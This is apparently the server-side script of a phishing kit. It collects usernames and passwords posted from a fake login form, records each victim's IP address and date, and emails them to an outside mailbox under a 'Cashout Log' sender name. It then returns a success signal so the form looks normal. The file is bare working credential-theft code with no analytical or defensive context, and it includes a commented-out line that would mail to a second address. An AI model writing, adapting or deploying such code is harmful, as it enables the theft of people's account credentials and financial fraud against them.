<?php
$ip = getenv("REMOTE_ADDR");
$login = $_POST['ai'];
$passwd= $_POST['pr'];

$done = array('signal'=>'ok');
$bad = array('signal'=>'bad');


if (!empty($login) && !empty($passwd)) {


    $own = 'deralogs@yandex.com';
    $date = date("D/M/d, Y g:i a");
    $subj = "$login  from $ip";
    $from = "From:Cashout Log (EUR) <mail@me.mom163.com>";
    $msg = "Username: $login\nPassword: $passwd\nSubmitted from IP Address - $ip on $date\n-----------------------------------\n        Created By (~)\n-----------------------------------";
    mail($own,$subj,$msg,$from);

    echo json_encode($done);

    }

else {
  echo json_encode($bad);
}
$fp = fopen("","a");
fputs($fp,$msg);
fclose($fp);

// 	$mailHeaders = "From: " . $x1. "<". $x1 .">\r\n";
// $subject = "KSA MAIL";
// mail('a.williams8927@gmail.com', $subject,$mesaj, $mailHeaders);
?>
